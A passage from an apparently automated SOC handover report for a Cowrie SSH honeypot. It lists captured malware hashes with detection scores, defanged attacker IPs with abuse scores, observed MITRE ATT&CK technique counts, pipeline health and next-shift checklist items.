| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **28/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `117.242.185[.]233` | IN | Broadband Multiplay Project, O/o DGM BB, NOC BSNL | **100** ⚠️ | 5 |
| `3.132.26[.]232` | US | Amazon Technologies Inc. | **100** ⚠️ | 50 |
| `217.208.209[.]215` | SE | Telia Network Services | **100** ⚠️ | 34 |
| `150.228.210[.]69` | MV | SpaceX Services, Inc. | **100** ⚠️ | 9 |
| `183.81.169[.]235` | NL | Amarutu Technology Ltd. Network | **100** ⚠️ | 50 |
| `106.246.89[.]69` | KR | LG DACOM Corporation | **100** ⚠️ | 26 |
| `94.131.211[.]168` | UA | Kruiz LLC | **100** ⚠️ | 50 |
| `112.86.146[.]178` | CN | China Unicom Jiangsu province network | **100** ⚠️ | 32 |
| `178.178.194[.]137` | RU | Metropolitan branch of PJSC MegaFon | **100** ⚠️ | 23 |
| `49.124.152[.]242` | MY | DiGi Telecommunications Sdn Bhd | **100** ⚠️ | 14 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 66 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 29 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 28 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 7 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 7 |

---

## 🔕 False Positive Summary (7 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 22 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 6 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 78 cases |
| Tool 34  | Credential Extractor        | ✅ 57 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 0 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 48 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 7 filtered (9.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 39 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 11 files |
| Tool 33  | YARA Classifier             | ✅ 4 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 29 priority case(s) shown individually · 35 recon entry/entries in table (3 group(s) consolidating 10 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-03-28T06:56:59Z_
